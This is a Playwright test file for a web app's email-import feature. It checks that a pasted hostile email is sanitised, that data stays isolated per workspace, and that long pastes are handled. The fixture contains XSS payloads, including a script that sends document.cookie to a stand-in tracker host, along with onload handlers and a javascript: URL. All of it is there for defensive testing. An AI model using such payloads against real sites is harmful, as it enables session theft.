import { randomUUID } from 'node:crypto'
import { expect, test, type Page } from '@playwright/test'
import { login } from './accounts'
import { newOwner } from './new-owner'

// Original synthetic hostile email: every external host is fictional.
const hostile = [
  '<html><head><style>body{background:url(https://tracker.example/bg.gif)}</style>',
  '<script>fetch("https://tracker.example/steal?c="+document.cookie)</script></head>',
  '<body onload="alert(1)"><img src="https://tracker.example/open.gif" width="1" height="1">',
  '<h1>Spring edit</h1><p>Fresh layers for slow weekends.</p>',
  '<p><a href="https://tracker.example/click?u=1">Shop the edit</a></p>',
  '<iframe src="https://evil.example/frame"></iframe>',
  '<svg onload="alert(2)"></svg><p>&lt;script&gt;shown as text&lt;/script&gt;</p></body></html>'
].join('\n')
const embedded = 'img, script, iframe, object, embed, svg, a[href*="example"]'

function watchExternal(page: Page) {
  const seen: string[] = []
  page.on('request', (request) => {
    if (/tracker\.example|evil\.example|shop\.example/.test(request.url()))
      seen.push(new URL(request.url()).hostname)
  })
  return seen
}

async function fillPaste(page: Page, subject: string, url: string) {
  await page.getByLabel('Subject line').fill(subject)
  await page.getByLabel('Email text').fill(hostile)
  const details = page.getByText('Where is it from? · optional')
  if (!(await page.getByLabel('Web address').isVisible())) await details.click()
  await page.getByLabel('Short description').fill('A fictional newsletter')
  await page.getByLabel('Web address').fill(url)
}

test('owner pastes a hostile email, recovers from failure, replays safely and reopens the same draft', async ({
  page
}, info) => {
  const db = await newOwner(page, {
    prefix: 'pasted',
    name: 'Original paste studio'
  })
  const external = watchExternal(page)
  await page.goto('/get-started?step=reference')
  await page.getByRole('link', { name: 'Paste an email' }).click()
  await expect(page).toHaveURL(/\/import-reference\?attempt=[a-f0-9-]+$/)
  const attemptUrl = page.url()
  const subject = `Original paste ${randomUUID().slice(0, 8)}`
  await fillPaste(page, subject, 'javascript:alert(1)')
  const preview = page.getByRole('region', { name: 'Plain-text preview' })
  await expect(preview).toContainText('Spring edit')
  await expect(preview).toContainText('<script>shown as text</script>')
  await expect(preview).not.toContainText('alert')
  await expect(preview).not.toContainText('tracker.example')
  expect(await page.locator('form').locator(embedded).count()).toBe(0)
  if (info.project.name.startsWith('mobile'))
    await page.setViewportSize({ width: 320, height: 800 })
  expect(
    await page.evaluate(
      () => document.documentElement.scrollWidth <= innerWidth
    )
  ).toBe(true)
  await page.screenshot({
    path: `test-results/ref-002/import-${info.project.name}.png`,
    fullPage: true
  })
  await page.getByRole('button', { name: 'Save and use this email' }).click()
  await expect(page.getByText(/Use a full web address/)).toBeVisible()
  await expect(page.getByLabel('Subject line')).toHaveValue(subject)
  await expect(page.getByLabel('Email text')).toHaveValue(hostile)
  await expect(page.getByLabel('Web address')).toHaveValue(
    'javascript:alert(1)'
  )
  await page.getByLabel('Web address').fill('https://shop.example/spring')
  await page.getByRole('button', { name: 'Save and use this email' }).click()
  // Saving opens the rewrite-or-copy choice for the saved email.
  await expect(page).toHaveURL(
    /\/create-email\/[a-f0-9-]+\?attempt=[a-f0-9-]+$/
  )
  const importedId = new URL(page.url()).pathname.split('/').at(-1)!
  // Replaying the same request returns the same saved reference.
  await page.goto(attemptUrl)
  await fillPaste(page, subject, 'https://shop.example/spring')
  await page.getByRole('button', { name: 'Save and use this email' }).click()
  await expect(page).toHaveURL(new RegExp(`/create-email/${importedId}\\?`))
  await page
    .getByRole('link', { name: 'Use only its outline in a new plan' })
    .click()
  await expect(page).toHaveURL(new RegExp(`imported=${importedId}`))
  const saved = await db
    .from('reference_imports')
    .select('id,origin,original_body,readable_text,source_url,structure')
    .eq('subject', subject)
  expect(saved.error).toBeNull()
  expect(saved.data).toHaveLength(1)
  expect(saved.data![0]).toMatchObject({
    id: importedId,
    origin: 'owner_import',
    // Browsers submit textarea line breaks as CRLF; that received text is kept.
    original_body: hostile.replace(/\n/g, '\r\n'),
    source_url: 'https://shop.example/spring',
    structure: ['Opening', 'Body', 'Closing']
  })
  expect(saved.data![0].readable_text).not.toContain('\r')
  for (const removed of [
    '<html',
    '<img',
    '<iframe',
    'tracker.example',
    'alert('
  ])
    expect(saved.data![0].readable_text).not.toContain(removed)
  // Entity-encoded text stays visible as literal words, never as markup.
  expect(saved.data![0].readable_text).toContain(
    '<script>shown as text</script>'
  )
  await expect(page.getByLabel('Start with')).toHaveValue(
    `imported:${importedId}`
  )
  await expect(page.getByText(/Added by you/)).toContainText(
    'A fictional newsletter'
  )
  await page.getByText('See the email you added', { exact: true }).click()
  await expect(page.getByText(/Fresh layers for slow weekends/)).toBeVisible()
  expect(await page.locator('form').locator(embedded).count()).toBe(0)
  await page.screenshot({
    path: `test-results/ref-002/composer-${info.project.name}.png`,
    fullPage: true
  })
  const title = `Pasted outline draft ${randomUUID().slice(0, 8)}`
  await page
    .getByLabel('What should this email do?')
    .fill('Adapt this outline using our original brand facts.')
  await page.getByText('Plan details · optional').click()
  await page.getByLabel('Give it a name').fill(title)
  await page.getByRole('button', { name: 'Create my draft' }).click()
  await expect(page).toHaveURL(/\/campaigns\/[a-f0-9-]+$/)
  const campaignUrl = page.url()
  await expect(
    page.getByRole('heading', { name: 'Starting point · email you added' })
  ).toBeVisible()
  await expect(page.getByText(/were not copied/)).toBeVisible()
  const campaign = await db
    .from('campaigns')
    .select('lineage,calendar_state,copy_state,delivery_state')
    .eq('id', campaignUrl.split('/').at(-1)!)
    .single()
  expect(campaign.error).toBeNull()
  expect(campaign.data).toMatchObject({
    calendar_state: 'proposed',
    copy_state: 'draft',
    delivery_state: 'not_ready',
    lineage: {
      structureSource: 'imported_reference',
      structureId: importedId,
      origin: 'owner_import',
      analysis: 'none',
      copyReusable: false
    }
  })
  await page.goto('/dashboard')
  await page
    .getByRole('link', { name: new RegExp(title) })
    .first()
    .click()
  await expect(page).toHaveURL(campaignUrl)
  await page.reload()
  await expect(
    page.getByRole('heading', { name: 'Starting point · email you added' })
  ).toBeVisible()
  await page.screenshot({
    path: `test-results/ref-002/campaign-${info.project.name}.png`,
    fullPage: true
  })
  expect(external).toEqual([])
})

test('a pasted email stays in its workspace for two-workspace and foreign owners', async ({
  page,
  browser
}) => {
  const db = await newOwner(page, { prefix: 'pasted-iso' })
  const context = await db.rpc('resolve_client_context', {})
  expect(context.error).toBeNull()
  const first = context.data![0].tenant_id
  const imported = await db.rpc('import_pasted_reference', {
    t: first,
    request_key: randomUUID(),
    input: {
      subject: 'Workspace-private pasted note',
      body: 'Opening line\n\nClosing line',
      readable_text: 'Opening line\n\nClosing line',
      source_description: '',
      source_url: ''
    }
  })
  expect(imported.error).toBeNull()
  const slug = `pasted-second-${randomUUID()}`
  expect(
    (
      await db.rpc('create_tenant_workspace', {
        workspace_name: 'Second paste studio',
        workspace_slug: slug,
        workspace_timezone: 'UTC'
      })
    ).error
  ).toBeNull()
  const second = (
    await db.from('tenants').select('id').eq('slug', slug).single()
  ).data!.id
  const origin = new URL(page.url()).origin
  const useTenant = (id: string) =>
    page
      .context()
      .addCookies([{ name: 'gr-active-tenant', value: id, url: origin }])
  await useTenant(second)
  await page.goto(`/first-draft?imported=${imported.data}`)
  await expect(
    page.getByText('This reference is unavailable here.', { exact: false })
  ).toBeVisible()
  await expect(page.getByLabel('Start with')).toHaveValue('original')
  await expect(page.getByRole('option', { name: /added by you/ })).toHaveCount(
    0
  )
  await page.goto('/import-reference')
  await expect(
    page.getByRole('heading', { name: 'Emails you added' })
  ).toHaveCount(0)
  const crossed = await db.rpc('create_first_draft', {
    t: second,
    request_key: randomUUID(),
    source: 'imported_reference',
    source_id: imported.data!,
    input: {
      title: 'Cross workspace attempt',
      goal: 'This must not use another workspace source',
      channel: 'email_text',
      planned_at: new Date(Date.now() + 30 * 86400000).toISOString(),
      audience_id: '',
      product_id: '',
      offer_id: '',
      reference_notes: ''
    }
  })
  expect(crossed.error?.code).toBe('42501')
  await useTenant(first)
  await page.goto(`/first-draft?imported=${imported.data}`)
  await expect(page.getByLabel('Start with')).toHaveValue(
    `imported:${imported.data}`
  )
  const foreign = await browser.newContext()
  const foreignPage = await foreign.newPage()
  await login(foreignPage, 'other')
  await foreignPage.goto(`/first-draft?imported=${imported.data}`)
  await expect(
    foreignPage.getByText('This reference is unavailable here.', {
      exact: false
    })
  ).toBeVisible()
  await expect(
    foreignPage.getByText('Workspace-private pasted note')
  ).toHaveCount(0)
  await foreign.close()
})

test('a long paste keeps the full original and labels the limited preview after reopening', async ({
  page
}) => {
  const db = await newOwner(page, { prefix: 'pasted-long' })
  await page.goto('/import-reference')
  const subject = `Long original paste ${randomUUID().slice(0, 8)}`
  // The emoji's two UTF-16 halves straddle the 20,000-unit preview bound.
  const emoji = String.fromCodePoint(0x1f600)
  const body = `${'a'.repeat(19999)}${emoji} tail of the original\n\nSecond original paragraph`
  await page.getByLabel('Subject line').fill(subject)
  await page.getByLabel('Email text').fill(body)
  await expect(
    page.getByText(/Preview limited to the first 20,000/)
  ).toContainText('will be saved unchanged')
  await page.getByRole('button', { name: 'Save and use this email' }).click()
  await expect(page).toHaveURL(/\/create-email\/[a-f0-9-]+\?attempt=/)
  const longId = new URL(page.url()).pathname.split('/').at(-1)!
  const saved = await db
    .from('reference_imports')
    .select('original_body,readable_text')
    .eq('subject', subject)
    .single()
  expect(saved.error).toBeNull()
  expect(saved.data!.original_body).toBe(body.replace(/\n/g, '\r\n'))
  expect(saved.data!.original_body).toContain(`${emoji} tail of the original`)
  expect(saved.data!.readable_text).toHaveLength(20000)
  expect(saved.data!.readable_text.isWellFormed()).toBe(true)
  expect(
    saved.data!.readable_text.endsWith(`a${String.fromCodePoint(0x2026)}`)
  ).toBe(true)
  await page.goto(`/first-draft?imported=${longId}`)
  await page.getByText('See the email you added', { exact: true }).click()
  await expect(
    page.getByText(/Preview limited to the first 20,000/)
  ).toContainText('is saved unchanged')
})

test('staff can see setup but cannot add reference emails', async ({
  page
}) => {
  await login(page, 'staff')
  await page.goto('/import-reference')
  await expect(
    page.getByText('Ask your workspace owner to add reference emails.')
  ).toBeVisible()
  await expect(
    page.getByRole('button', { name: 'Save and use this email' })
  ).toHaveCount(0)
  await page.goto('/get-started?step=reference')
  await expect(page.getByRole('link', { name: 'Paste an email' })).toHaveCount(
    0
  )
})
